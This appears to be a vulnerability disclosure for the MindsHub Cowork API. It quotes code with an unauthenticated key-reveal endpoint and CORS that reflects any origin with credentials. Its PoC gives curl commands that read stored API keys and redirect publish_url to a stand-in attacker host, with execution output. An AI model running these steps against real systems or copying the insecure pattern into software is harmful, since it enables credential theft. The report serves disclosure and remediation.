# MindsHub: unauthenticated API key disclosure with CORS origin reflection — any website can steal local credentials

## Description

The MindsHub Cowork API (`backend/core_api`) exposes provider API keys without authentication, and the CORS configuration reflects any origin with credentials enabled:

```python
# cowork/server.py L71-79
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],       # reflects any Origin header
    allow_credentials=True,    # allows credentialed cross-origin reads
    ...
)

# cowork/api/v1/endpoints/settings.py L107-119
@router.get("/reveal-key/{name}")
def reveal_key(name: str, session: SessionDep):   # no auth dependency
    ...
    return {"value": val.get_secret_value()}      # returns the actual key
```

## Impact

Any website the MindsHub user visits can execute JavaScript that reads the user's stored API keys (Anthropic, OpenAI, MindsHub) via a simple `fetch()` to `http://localhost:<port>/api/v1/settings/reveal-key/<provider>`. The CORS middleware reflects the attacking page's origin and allows credentialed reads, bypassing the browser's same-origin policy.

Additionally, the unauthenticated PUT endpoint allows any origin to modify settings (including `publish_url`, redirecting artifact publishing to an attacker-controlled server) and create scheduled agent runs.

## PoC

```bash
# 1. Seed a key (simulating a configured deployment):
curl -X PUT http://localhost:26866/api/v1/settings/anthropic_api_key \
  -H "Content-Type: application/json" \
  -d '{"value":"sk-ant-REPRO-FAKE-KEY-mindshub42"}'

# 2. Read it back without any authentication:
curl http://localhost:26866/api/v1/settings/reveal-key/anthropic

# 3. Prove any origin can read it (CORS reflection):
curl -D- -H "Origin: https://malicious-page.xyz" \
  http://localhost:26866/api/v1/settings/reveal-key/anthropic

# 4. Modify publish_url to attacker-controlled server (also unauthenticated):
curl -X PUT http://localhost:26866/api/v1/settings/publish_url \
  -H "Content-Type: application/json" \
  -d '{"value":"https://attacker-evil.example.com/collect"}'
```

## Execution result

```
$ curl http://localhost:26866/api/v1/settings/reveal-key/anthropic
{"value":"sk-ant-REPRO-FAKE-KEY-mindshub42"}
[HTTP 200 — no authentication header sent]

$ curl -D- -H "Origin: https://malicious-page.xyz" \
    http://localhost:26866/api/v1/settings/reveal-key/anthropic
access-control-allow-origin: https://malicious-page.xyz
access-control-allow-credentials: true
access-control-expose-headers: *
{"value":"sk-ant-REPRO-FAKE-KEY-mindshub42"}

$ curl -X PUT .../api/v1/settings/publish_url -d '{"value":"https://attacker-evil.example.com/collect"}'
{"key":"publish_url","is_set":true,"value":"https://attacker-evil.example.com/collect"}
[HTTP 200 — publish_url hijacked, artifacts will be sent to attacker]

$ curl -X PUT .../api/v1/settings/minds_api_key -d '{"value":"REPRO-INJECTED-ENV-VALUE"}'
[HTTP 200]
$ curl .../api/v1/settings/reveal-key/minds
{"value":"REPRO-INJECTED-ENV-VALUE"}    ← arbitrary setting injection confirmed
```
